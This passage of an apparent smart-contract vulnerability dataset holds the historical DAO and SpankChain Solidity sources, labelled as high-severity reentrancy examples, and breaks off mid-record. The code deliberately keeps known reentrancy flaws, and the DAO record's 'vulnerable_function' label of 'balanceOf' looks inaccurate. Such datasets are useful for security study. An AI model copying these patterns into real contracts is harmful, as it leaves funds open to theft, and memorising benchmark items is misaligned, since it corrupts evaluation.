        || !p.open\n            // Does the transaction code match the proposal?\n            || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {\n\n            throw;\n        }\n\n        // If the curator removed the recipient from the whitelist, close the proposal\n        // in order to free the deposit and allow unblocking of voters\n        if (!isRecipientAllowed(p.recipient)) {\n            closeProposal(_proposalID);\n            p.creator.send(p.proposalDeposit);\n            return;\n        }\n\n        bool proposalCheck = true;\n\n        if (p.amount > actualBalance())\n            proposalCheck = false;\n\n        uint quorum = p.yea + p.nay;\n\n        // require 53% for calling newContract()\n        if (_transactionData.length >= 4 && _transactionData[0] == 0x68\n            && _transactionData[1] == 0x37 && _transactionData[2] == 0xff\n            && _transactionData[3] == 0x1e\n            && quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {\n\n                proposalCheck = false;\n        }\n\n        if (quorum >= minQuorum(p.amount)) {\n            if (!p.creator.send(p.proposalDeposit))\n                throw;\n\n            lastTimeMinQuorumMet = now;\n            // set the minQuorum to 20% again, in the case it has been reached\n            if (quorum > totalSupply / 5)\n                minQuorumDivisor = 5;\n        }\n\n        // Execute result\n        if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {\n            if (!p.recipient.call.value(p.amount)(_transactionData))\n                throw;\n\n            p.proposalPassed = true;\n            _success = true;\n\n            // only create reward tokens when ether is not sent to the DAO itself and\n            // related addresses. Proxy addresses should be forbidden by the curator.\n            if (p.recipient != address(this) && p.recipient != address(rewardAccount)\n                && p.recipient != address(DAOrewardAccount)\n                && p.recipient != address(extraBalance)\n                && p.recipient != address(curator)) {\n\n                rewardToken[address(this)] += p.amount;\n                totalRewardToken += p.amount;\n            }\n        }\n\n        closeProposal(_proposalID);\n\n        // Initiate event\n        ProposalTallied(_proposalID, _success, quorum);\n    }\n\n\n    function closeProposal(uint _proposalID) internal {\n        Proposal p = proposals[_proposalID];\n        if (p.open)\n            sumOfProposalDeposits -= p.proposalDeposit;\n        p.open = false;\n    }\n\n    function splitDAO(\n        uint _proposalID,\n        address _newCurator\n    ) noEther onlyTokenholders returns (bool _success) {\n\n        Proposal p = proposals[_proposalID];\n\n        // Sanity check\n\n        if (now < p.votingDeadline  // has the voting deadline arrived?\n            //The request for a split expires XX days after the voting deadline\n            || now > p.votingDeadline + splitExecutionPeriod\n            // Does the new Curator address match?\n            || p.recipient != _newCurator\n            // Is it a new curator proposal?\n            || !p.newCurator\n            // Have you voted for this split?\n            || !p.votedYes[msg.sender]\n            // Did you already vote on another proposal?\n            || (blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0) )  {\n\n            throw;\n        }\n\n        // If the new DAO doesn't exist yet, create the new DAO and store the\n        // current split data\n        if (address(p.splitData[0].newDAO) == 0) {\n            p.splitData[0].newDAO = createNewDAO(_newCurator);\n            // Call depth limit reached, etc.\n            if (address(p.splitData[0].newDAO) == 0)\n                throw;\n            // should never happen\n            if (this.balance < sumOfProposalDeposits)\n                throw;\n            p.splitData[0].splitBalance = actualBalance();\n            p.splitData[0].rewardToken = rewardToken[address(this)];\n            p.splitData[0].totalSupply = totalSupply;\n            p.proposalPassed = true;\n        }\n\n        // Move ether and assign new Tokens\n        uint fundsToBeMoved =\n            (balances[msg.sender] * p.splitData[0].splitBalance) /\n            p.splitData[0].totalSupply;\n        if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)\n            throw;\n\n\n        // Assign reward rights to new DAO\n        uint rewardTokenToBeMoved =\n            (balances[msg.sender] * p.splitData[0].rewardToken) /\n            p.splitData[0].totalSupply;\n\n        uint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /\n            rewardToken[address(this)];\n\n        rewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved;\n        if (rewardToken[address(this)] < rewardTokenToBeMoved)\n            throw;\n        rewardToken[address(this)] -= rewardTokenToBeMoved;\n\n        DAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved;\n        if (DAOpaidOut[address(this)] < paidOutToBeMoved)\n            throw;\n        DAOpaidOut[address(this)] -= paidOutToBeMoved;\n\n        // Burn DAO Tokens\n        Transfer(msg.sender, 0, balances[msg.sender]);\n        withdrawRewardFor(msg.sender); // be nice, and get his rewards\n        totalSupply -= balances[msg.sender];\n        balances[msg.sender] = 0;\n        paidOut[msg.sender] = 0;\n        return true;\n    }\n\n    function newContract(address _newContract){\n        if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;\n        // move all ether\n        if (!_newContract.call.value(address(this).balance)()) {\n            throw;\n        }\n\n        //move all reward tokens\n        rewardToken[_newContract] += rewardToken[address(this)];\n        rewardToken[address(this)] = 0;\n        DAOpaidOut[_newContract] += DAOpaidOut[address(this)];\n        DAOpaidOut[address(this)] = 0;\n    }\n\n\n    function retrieveDAOReward(bool _toMembers) external noEther returns (bool _success) {\n        DAO dao = DAO(msg.sender);\n\n        if ((rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /\n            totalRewardToken < DAOpaidOut[msg.sender])\n            throw;\n\n        uint reward =\n            (rewardToken[msg.sender] * DAOrewardAccount.accumulatedInput()) /\n            totalRewardToken - DAOpaidOut[msg.sender];\n        if(_toMembers) {\n            if (!DAOrewardAccount.payOut(dao.rewardAccount(), reward))\n                throw;\n            }\n        else {\n            if (!DAOrewardAccount.payOut(dao, reward))\n                throw;\n        }\n        DAOpaidOut[msg.sender] += reward;\n        return true;\n    }\n\n    function getMyReward() noEther returns (bool _success) {\n        return withdrawRewardFor(msg.sender);\n    }\n\n\n    function withdrawRewardFor(address _account) noEther internal returns (bool _success) {\n        if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])\n            throw;\n\n        uint reward =\n            (balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];\n        if (!rewardAccount.payOut(_account, reward))\n            throw;\n        paidOut[_account] += reward;\n        return true;\n    }\n\n\n    function transfer(address _to, uint256 _value) returns (bool success) {\n        if (isFueled\n            && now > closingTime\n            && !isBlocked(msg.sender)\n            && transferPaidOut(msg.sender, _to, _value)\n            && super.transfer(_to, _value)) {\n\n            return true;\n        } else {\n            throw;\n        }\n    }\n\n\n    function transferWithoutReward(address _to, uint256 _value) returns (bool success) {\n        if (!getMyReward())\n            throw;\n        return transfer(_to, _value);\n    }\n\n\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n        if (isFueled\n            && now > closingTime\n            && !isBlocked(_from)\n            && transferPaidOut(_from, _to, _value)\n            && super.transferFrom(_from, _to, _value)) {\n\n            return true;\n        } else {\n            throw;\n        }\n    }\n\n\n    function transferFromWithoutReward(\n        address _from,\n        address _to,\n        uint256 _value\n    ) returns (bool success) {\n\n        if (!withdrawRewardFor(_from))\n            throw;\n        return transferFrom(_from, _to, _value);\n    }\n\n\n    function transferPaidOut(\n        address _from,\n        address _to,\n        uint256 _value\n    ) internal returns (bool success) {\n\n        uint transferPaidOut = paidOut[_from] * _value / balanceOf(_from);\n        if (transferPaidOut > paidOut[_from])\n            throw;\n        paidOut[_from] -= transferPaidOut;\n        paidOut[_to] += transferPaidOut;\n        return true;\n    }\n\n\n    function changeProposalDeposit(uint _proposalDeposit) noEther external {\n        if (msg.sender != address(this) || _proposalDeposit > (actualBalance() + rewardToken[address(this)])\n            / maxDepositDivisor) {\n\n            throw;\n        }\n        proposalDeposit = _proposalDeposit;\n    }\n\n\n    function changeAllowedRecipients(address _recipient, bool _allowed) noEther external returns (bool _success) {\n        if (msg.sender != curator)\n            throw;\n        allowedRecipients[_recipient] = _allowed;\n        AllowedRecipientChanged(_recipient, _allowed);\n        return true;\n    }\n\n\n    function isRecipientAllowed(address _recipient) internal returns (bool _isAllowed) {\n        if (allowedRecipients[_recipient]\n            || (_recipient == address(extraBalance)\n                // only allowed when at least the amount held in the\n                // extraBalance account has been spent from the DAO\n                && totalRewardToken > extraBalance.accumulatedInput()))\n            return true;\n        else\n            return false;\n    }\n\n    function actualBalance() constant returns (uint _actualBalance) {\n        return this.balance - sumOfProposalDeposits;\n    }\n\n\n    function minQuorum(uint _value) internal constant returns (uint _minQuorum) {\n        // minimum of 20% and maximum of 53.33%\n        return totalSupply / minQuorumDivisor +\n            (_value * totalSupply) / (3 * (actualBalance() + rewardToken[address(this)]));\n    }\n\n\n    function halveMinQuorum() returns (bool _success) {\n        // this can only be called after `quorumHalvingPeriod` has passed or at anytime\n        // by the curator with a delay of at least `minProposalDebatePeriod` between the calls\n        if ((lastTimeMinQuorumMet < (now - quorumHalvingPeriod) || msg.sender == curator)\n            && lastTimeMinQuorumMet < (now - minProposalDebatePeriod)) {\n            lastTimeMinQuorumMet = now;\n            minQuorumDivisor *= 2;\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function createNewDAO(address _newCurator) internal returns (DAO _newDAO) {\n        NewCurator(_newCurator);\n        return daoCreator.createDAO(_newCurator, 0, 0, now + splitExecutionPeriod);\n    }\n\n    function numberOfProposals() constant returns (uint _numberOfProposals) {\n        // Don't count index 0. It's used by isBlocked() and exists from start\n        return proposals.length - 1;\n    }\n\n    function getNewDAOAddress(uint _proposalID) constant returns (address _newDAO) {\n        return proposals[_proposalID].splitData[0].newDAO;\n    }\n\n    function isBlocked(address _account) internal returns (bool) {\n        if (blocked[_account] == 0)\n            return false;\n        Proposal p = proposals[blocked[_account]];\n        if (now > p.votingDeadline) {\n            blocked[_account] = 0;\n            return false;\n        } else {\n            return true;\n        }\n    }\n\n    function unblockMe() returns (bool) {\n        return isBlocked(msg.sender);\n    }\n}\n\ncontract DAO_Creator {\n    function createDAO(\n        address _curator,\n        uint _proposalDeposit,\n        uint _minTokensToCreate,\n        uint _closingTime\n    ) returns (DAO _newDAO) {\n\n        return new DAO(\n            _curator,\n            DAO_Creator(this),\n            _proposalDeposit,\n            _minTokensToCreate,\n            _closingTime,\n            msg.sender\n        );\n    }\n}\n",
    "vulnerable_function": "balanceOf",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "# Re-entrancy\nA state variable is changed after a contract uses `call.value`. The attacker uses\n[a fallback function](ReentrancyExploit.sol#L26-L33)\u2014which is automatically executed after\nEther is transferred from the targeted contract\u2014to execute the vulnerable function again, *before* the\nstate variable is changed.",
    "fix_description": "",
    "references": [
      "http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/",
      "https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "reentrancy/DAO_source_code/DAO.sol",
    "pragma": "unknown",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_reentrancy_spankchain_payment",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SpankChain_Payment.sol",
    "file_content": "// https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code\n\npragma solidity ^0.4.23;\n// produced by the Solididy File Flattener (c) David Appleton 2018\n// contact : dave@akomba.com\n// released under Apache 2.0 licence\ncontract Token {\n    /* This is a slight change to the ERC20 base standard.\n    function totalSupply() constant returns (uint256 supply);\n    is replaced with:\n    uint256 public totalSupply;\n    This automatically creates a getter function for the totalSupply.\n    This is moved to the base contract since public getter functions are not\n    currently recognised as an implementation of the matching abstract\n    function by the compiler.\n    */\n    /// total amount of tokens\n    uint256 public totalSupply;\n\n    /// @param _owner The address from which the balance will be retrieved\n    /// @return The balance\n    function balanceOf(address _owner) public constant returns (uint256 balance);\n\n    /// @notice send `_value` token to `_to` from `msg.sender`\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function transfer(address _to, uint256 _value) public returns (bool success);\n\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n    /// @param _from The address of the sender\n    /// @param _to The address of the recipient\n    /// @param _value The amount of token to be transferred\n    /// @return Whether the transfer was successful or not\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n\n    /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @param _value The amount of tokens to be approved for transfer\n    /// @return Whether the approval was successful or not\n    function approve(address _spender, uint256 _value) public returns (bool success);\n\n    /// @param _owner The address of the account owning tokens\n    /// @param _spender The address of the account able to transfer the tokens\n    /// @return Amount of remaining tokens allowed to spent\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\nlibrary ECTools {\n\n    // @dev Recovers the address which has signed a message\n    // @thanks https://gist.github.com/axic/5b33912c6f61ae6fd96d6c4a47afde6d\n    function recoverSigner(bytes32 _hashedMsg, string _sig) public pure returns (address) {\n        require(_hashedMsg != 0x00);\n\n        // need this for test RPC\n        bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n        bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, _hashedMsg));\n\n        if (bytes(_sig).length != 132) {\n            return 0x0;\n        }\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n        bytes memory sig = hexstrToBytes(substring(_sig, 2, 132));\n        assembly {\n            r := mload(add(sig, 32))\n            s := mload(add(sig, 64))\n            v := byte(0, mload(add(sig, 96)))\n        }\n        if (v < 27) {\n            v += 27;\n        }\n        if (v < 27 || v > 28) {\n            return 0x0;\n        }\n        return ecrecover(prefixedHash, v, r, s);\n    }\n\n    // @dev Verifies if the message is signed by an address\n    function isSignedBy(bytes32 _hashedMsg, string _sig, address _addr) public pure returns (bool) {\n        require(_addr != 0x0);\n\n        return _addr == recoverSigner(_hashedMsg, _sig);\n    }\n\n    // @dev Converts an hexstring to bytes\n    function hexstrToBytes(string _hexstr) public pure returns (bytes) {\n        uint len = bytes(_hexstr).length;\n        require(len % 2 == 0);\n\n        bytes memory bstr = bytes(new string(len / 2));\n        uint k = 0;\n        string memory s;\n        string memory r;\n        for (uint i = 0; i < len; i += 2) {\n            s = substring(_hexstr, i, i + 1);\n            r = substring(_hexstr, i + 1, i + 2);\n            uint p = parseInt16Char(s) * 16 + parseInt16Char(r);\n            bstr[k++] = uintToBytes32(p)[31];\n        }\n        return bstr;\n    }\n\n    // @dev Parses a hexchar, like 'a', and returns its hex value, in this case 10\n    function parseInt16Char(string _char) public pure returns (uint) {\n        bytes memory bresult = bytes(_char);\n        // bool decimals = false;\n        if ((bresult[0] >= 48) && (bresult[0] <= 57)) {\n            return uint(bresult[0]) - 48;\n        } else if ((bresult[0] >= 65) && (bresult[0] <= 70)) {\n            return uint(bresult[0]) - 55;\n        } else if ((bresult[0] >= 97) && (bresult[0] <= 102)) {\n            return uint(bresult[0]) - 87;\n        } else {\n            revert();\n        }\n    }\n\n    // @dev Converts a uint to a bytes32\n    // @thanks https://ethereum.stackexchange.com/questions/4170/how-to-convert-a-uint-to-bytes-in-solidity\n    function uintToBytes32(uint _uint) public pure returns (bytes b) {\n        b = new bytes(32);\n        assembly {mstore(add(b, 32), _uint)}\n    }\n\n    // @dev Hashes the signed message\n    // @ref https://github.com/ethereum/go-ethereum/issues/3731#issuecomment-293866868\n    function toEthereumSignedMessage(string _msg) public pure returns (bytes32) {\n        uint len = bytes(_msg).length;\n        require(len > 0);\n        bytes memory prefix = \"\\x19Ethereum Signed Message:\\n\";\n        return keccak256(abi.encodePacked(prefix, uintToString(len), _msg));\n    }\n\n    // @dev Converts a uint in a string\n    function uintToString(uint _uint) public pure returns (string str) {\n        uint len = 0;\n        uint m = _uint + 0;\n        while (m != 0) {\n            len++;\n            m /= 10;\n        }\n        bytes memory b = new bytes(len);\n        uint i = len - 1;\n        while (_uint != 0) {\n            uint remainder = _uint % 10;\n            _uint = _uint / 10;\n            b[i--] = byte(48 + remainder);\n        }\n        str = string(b);\n    }\n\n\n    // @dev extract a substring\n    // @thanks https://ethereum.stackexchange.com/questions/31457/substring-in-solidity\n    function substring(string _str, uint _startIndex, uint _endIndex) public pure returns (string) {\n        bytes memory strBytes = bytes(_str);\n        require(_startIndex <= _endIndex);\n        require(_startIndex >= 0);\n        require(_endIndex <= strBytes.length);\n\n        bytes memory result = new bytes(_endIndex - _startIndex);\n        for (uint i = _startIndex; i < _endIndex; i++) {\n            result[i - _startIndex] = strBytes[i];\n        }\n        return string(result);\n    }\n}\ncontract StandardToken is Token {\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        //Default assumes totalSupply can't be over max (2^256 - 1).\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n        //Replace the if with this one instead.\n        //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\n        //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n        balances[_to] += _value;\n        balances[_from] -= _value;\n        allowed[_from][msg.sender] -= _value;\n        emit Transfer(_from, _to, _value);\n        return true;\n    }\n\n    function balanceOf(address _owner) public constant returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function approve(address _spender, uint256 _value) public returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n      return allowed[_owner][_spender];\n    }\n\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract HumanStandardToken is StandardToken {\n\n    /* Public variables of the token */\n\n    /*\n    NOTE:\n    The following variables are OPTIONAL vanities. One does not have to include them.\n    They allow one to customise the token contract & in no way influences the core functionality.\n    Some wallets/interfaces might not even bother to look at this information.\n    */\n    string public name;                   //fancy name: eg Simon Bucks\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n    string public symbol;                 //An identifier: eg SBX\n    string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n    constructor(\n        uint256 _initialAmount,\n        string _tokenName,\n        uint8 _decimalUnits,\n        string _tokenSymbol\n        ) public {\n        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\n        totalSupply = _initialAmount;                        // Update total supply\n        name = _tokenName;                                   // Set the name for display purposes\n        decimals = _decimalUnits;                            // Amount of decimals for display purposes\n        symbol = _tokenSymbol;                               // Set the symbol for display purposes\n    }\n\n    /* Approves and then calls the receiving contract */\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n        require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n        return true;\n    }\n}\n\ncontract LedgerChannel {\n\n    string public constant NAME = \"Ledger Channel\";\n    string public constant VERSION = \"0.0.1\";\n\n    uint256 public numChannels = 0;\n\n    event DidLCOpen (\n        bytes32 indexed channelId,\n        address indexed partyA,\n        address indexed partyI,\n        uint256 ethBalanceA,\n        address token,\n        uint256 tokenBalanceA,\n        uint256 LCopenTimeout\n    );\n\n    event DidLCJoin (\n        bytes32 indexed channelId,\n        uint256 ethBalanceI,\n        uint256 tokenBalanceI\n    );\n\n    event DidLCDeposit (\n        bytes32 indexed channelId,\n        address indexed recipient,\n        uint256 deposit,\n        bool isToken\n    );\n\n    event DidLCUpdateState (\n        bytes32 indexed channelId, \n        uint256 sequence, \n        uint256 numOpenVc, \n        uint256 ethBalanceA,\n        uint256 tokenBalanceA,\n        uint256 ethBalanceI,\n        uint256 tokenBalanceI,\n        bytes32 vcRoot,\n        uint256 updateLCtimeout\n    );\n\n    event DidLCClose (\n        bytes32 indexed channelId,\n        uint256 sequence,\n        uint256 ethBalanceA,\n        uint256 tokenBalanceA,\n        uint256 ethBalanceI,\n        uint256 tokenBalanceI\n    );\n\n    event DidVCInit (\n        bytes32 indexed lcId, \n        bytes32 indexed vcId, \n        bytes proof, \n        uint256 sequence, \n        address partyA, \n        address partyB, \n        uint256 balanceA, \n        uint256 balanceB \n    );\n\n    event DidVCSettle (\n        bytes32 indexed lcId, \n        bytes32 indexed vcId,\n        uint256 updateSeq, \n        uint256 updateBalA, \n        uint256 updateBalB,\n        address challenger,\n        uint256 updateVCtimeout\n    );\n\n    event DidVCClose(\n        bytes32 indexed lcId, \n        bytes32 indexed vcId, \n        uint256 balanceA, \n        uint256 balanceB\n    );\n\n    struct Channel {\n        //TODO: figure out if it's better just to split arrays by balances/deposits instead of eth/erc20\n        address[2] partyAddresses; // 0: partyA 1: partyI\n        uint256[4] ethBalances; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n        uint256[4] erc20Balances; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n        uint256[2] initialDeposit; // 0: eth 1: tokens\n        uint256 sequence;\n        uint256 confirmTime;\n        bytes32 VCrootHash;\n        uint256 LCopenTimeout;\n        uint256 updateLCtimeout; // when update LC times out\n        bool isOpen; // true when both parties have joined\n        bool isUpdateLCSettling;\n        uint256 numOpenVC;\n        HumanStandardToken token;\n    }\n\n    // virtual-channel state\n    struct VirtualChannel {\n        bool isClose;\n        bool isInSettlementState;\n        uint256 sequence;\n        address challenger; // Initiator of challenge\n        uint256 updateVCtimeout; // when update VC times out\n        // channel state\n        address partyA; // VC participant A\n        address partyB; // VC participant B\n        address partyI; // LC hub\n        uint256[2] ethBalances;\n        uint256[2] erc20Balances;\n        uint256[2] bond;\n        HumanStandardToken token;\n    }\n\n    mapping(bytes32 => VirtualChannel) public virtualChannels;\n    mapping(bytes32 => Channel) public Channels;\n\n    function createChannel(\n        bytes32 _lcID,\n        address _partyI,\n        uint256 _confirmTime,\n        address _token,\n        uint256[2] _balances // [eth, token]\n    ) \n        public\n        payable \n    {\n        require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\n        require(_partyI != 0x0, \"No partyI address provided to LC creation\");\n        require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\n        // Set initial ledger channel state\n        // Alice must execute this and we assume the initial state \n        // to be signed from this requirement\n        // Alternative is to check a sig as in joinChannel\n        Channels[_lcID].partyAddresses[0] = msg.sender;\n        Channels[_lcID].partyAddresses[1] = _partyI;\n\n        if(_balances[0] != 0) {\n            require(msg.value == _balances[0], \"Eth balance does not match sent value\");\n            Channels[_lcID].ethBalances[0] = msg.value;\n        } \n        if(_balances[1] != 0) {\n            Channels[_lcID].token = HumanStandardToken(_token);\n            require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\n            Channels[_lcID].erc20Balances[0] = _balances[1];\n        }\n\n        Channels[_lcID].sequence = 0;\n        Channels[_lcID].confirmTime = _confirmTime;\n        // is close flag, lc state sequence, number open vc, vc root hash, partyA... \n        //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n        Channels[_lcID].LCopenTimeout = now + _confirmTime;\n        Channels[_lcID].initialDeposit = _balances;\n\n        emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n    }\n\n    function LCOpenTimeout(bytes32 _lcID) public {\n        require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\n        require(now > Channels[_lcID].LCopenTimeout);\n\n        if(Channels[_lcID].initialDeposit[0] != 0) {\n            Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n        } \n        if(Channels[_lcID].initialDeposit[1] != 0) {\n            require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n        }\n\n        emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\n\n        // only safe to delete since no action was taken on this channel\n        delete Channels[_lcID];\n    }\n\n    function joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {\n        // require the channel is not open yet\n        require(Channels[_lcID].isOpen == false);\n        require(msg.sender == Channels[_lcID].partyAddresses[1]);\n\n        if(_balances[0] != 0) {\n            require(msg.value == _balances[0], \"state balance does not match sent value\");\n            Channels[_lcID].ethBalances[1] = msg.value;\n        } \n        if(_balances[1] != 0) {\n            require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"joinChannel: token transfer failure\");\n            Channels[_lcID].erc20Balances[1] = _balances[1];          \n        }\n\n        Channels[_lcID].initialDeposit[0]+=_balances[0];\n        Channels[_lcID].initialDeposit[1]+=_balances[1];\n        // no longer allow joining functions to be called\n        Channels[_lcID].isOpen = true;\n        numChannels++;\n\n        emit DidLCJoin(_lcID, _balances[0], _balances[1]);\n    }\n\n\n    // additive updates of monetary state\n    // TODO check this for attack vectors\n    function deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {\n        require(Channels[_lcID].isOpen == true, \"Tried adding funds to a closed channel\");\n        require(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);\n\n        //if(Channels[_lcID].token)\n\n        if (Channels[_lcID].partyAddresses[0] == recipient) {\n            if(isToken) {\n                require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n                Channels[_lcID].erc20Balances[2] += _balance;\n            } else {\n                require(msg.value == _balance, \"state balance does not match sent value\");\n                Channels[_lcID].ethBalances[2] += msg.value;\n            }\n        }\n\n        if (Channels[_lcID].partyAddresses[1] == recipient) {\n            if(isToken) {\n                require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n                Channels[_lcID].erc20Balances[3] += _balance;\n            } else {\n                require(msg.value == _balance, \"state balance does not match sent value\");\n                Channels[_lcID].ethBalances[3] += msg.value; \n            }\n        }\n        \n        emit DidLCDeposit(_lcID, recipient, _balance, isToken);\n    }\n\n    // TODO: Check there are no open virtual channels, the client should have cought this before signing a close LC state update\n    function consensusCloseChannel(\n        bytes32 _lcID, \n        uint256 _sequence, \n        uint256[4] _balances, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n        string _sigA, \n        string _sigI\n    ) \n        public \n    {\n        // assume num open vc is 0 and root hash is 0x0\n        //require(Channels[_lcID].sequence < _sequence);\n        require(Channels[_lcID].isOpen == true);\n        uint256 totalEthDeposit = Channels[_lcID].initialDeposit[0] + Channels[_lcID].ethBalances[2] + Channels[_lcID].ethBalances[3];\n        uint256 totalTokenDeposit = Channels[_lcID].initialDeposit[1] + Channels[_lcID].erc20Balances[2] + Channels[_lcID].erc20Balances[3];\n        require(totalEthDeposit == _balances[0] + _balances[1]);\n        require(totalTokenDeposit == _balances[2] + _balances[3]);\n\n        bytes32 _state = keccak256(\n            abi.encodePacked(\n                _lcID,\n                true,\n                _sequence,\n                uint256(0),\n                bytes32(0x0),\n                Channels[_lcID].partyAddresses[0], \n                Channels[_lcID].partyAddresses[1], \n                _balances[0], \n                _balances[1],\n                _balances[2],\n                _balances[3]\n            )\n        );\n\n        require(Channels[_lcID].partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n        require(Channels[_lcID].partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n\n        Channels[_lcID].isOpen = false;\n\n        if(_balances[0] != 0 || _balances[1] != 0) {\n            Channels[_lcID].partyAddresses[0].transfer(_balances[0]);\n            Channels[_lcID].partyAddresses[1].transfer(_balances[1]);\n        }\n\n        if(_balances[2] != 0 || _balances[3] != 0) {\n            require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], _balances[2]),\"happyCloseChannel: token transfer failure\");\n            require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[1], _balances[3]),\"happyCloseChannel: token transfer failure\");          \n        }\n\n        numChannels--;\n\n        emit DidLCClose(_lcID, _sequence, _balances[0], _balances[1], _balances[2], _balances[3]);\n    }\n\n    // Byzantine functions\n\n    function updateLCstate(\n        bytes32 _lcID, \n        uint256[6] updateParams, // [sequence, numOpenVc, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI]\n        bytes32 _VCroot, \n        string _sigA, \n        string _sigI\n    ) \n        public \n    {\n        Channel storage channel = Channels[_lcID];\n        require(channel.isOpen);\n        require(channel.sequence < updateParams[0]); // do same as vc sequence check\n        require(channel.ethBalances[0] + channel.ethBalances[1] >= updateParams[2] + updateParams[3]);\n        require(channel.erc20Balances[0] + channel.erc20Balances[1] >= updateParams[4] + updateParams[5]);\n\n        if(channel.isUpdateLCSettling == true) { \n            require(channel.updateLCtimeout > now);\n        }\n      \n        bytes32 _state = keccak256(\n            abi.encodePacked(\n                _lcID,\n                false, \n                updateParams[0], \n                updateParams[1], \n                _VCroot, \n                channel.partyAddresses[0], \n                channel.partyAddresses[1], \n                updateParams[2], \n                updateParams[3],\n                updateParams[4], \n        